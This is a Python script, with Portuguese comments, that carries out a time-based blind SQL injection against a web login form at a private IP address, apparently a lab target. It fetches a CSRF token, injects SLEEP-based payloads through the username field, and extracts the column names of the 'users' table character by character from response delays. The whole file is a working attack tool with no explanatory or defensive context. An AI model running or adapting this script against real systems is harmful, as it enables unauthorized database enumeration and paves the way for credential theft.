import requests
import time
import string
from bs4 import BeautifulSoup

# Configurações
base_url = "http://172.16.3.96"
login_url = f"{base_url}"
delay_threshold = 4
charset = string.ascii_lowercase + string.digits + "_"

session = requests.Session()

def get_csrf_token():
    try:
        response = session.get(login_url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': '_token'})['value']
        return token
    except Exception as e:
        print(f"[!] Erro ao obter CSRF token: {e}")
        return None

def test_payload(payload):
    token = get_csrf_token()
    if not token:
        return False
    data = {
        "_token": token,
        "username": payload,
        "password": "qualquercoisa"
    }
    try:
        start = time.time()
        r = session.post(login_url, data=data, timeout=10)
        elapsed = time.time() - start
        return elapsed >= delay_threshold
    except requests.exceptions.RequestException as e:
        print(f"[!] Erro de conexão: {e}")
        return False

def extract_column_name(table="users", column_index=0, max_length=30):
    prefix = ""
    for pos in range(1, max_length + 1):
        found = False
        for c in charset:
            guess = prefix + c
            payload = (
                f"admin' OR IF((SELECT column_name FROM information_schema.columns "
                f"WHERE table_name='{table}' LIMIT {column_index},1) LIKE '{guess}%', SLEEP(5), 0)-- -"
            )
            if test_payload(payload):
                prefix += c
                print(f"    [+] Letra {pos}: {c} (prefixo atual: {prefix})")
                found = True
                break
        if not found:
            break
    return prefix

def dump_all_columns(table="users"):
    index = 0
    print(f"[*] Iniciando extração de colunas da tabela '{table}'")
    while True:
        print(f"\n[→] Coluna #{index}:")
        name = extract_column_name(table=table, column_index=index)
        if not name:
            print("[*] Nenhuma coluna encontrada, encerrando.")
            break
        print(f"[✓] Coluna #{index} extraída: {name}")
        index += 1

if __name__ == "__main__":
    dump_all_columns()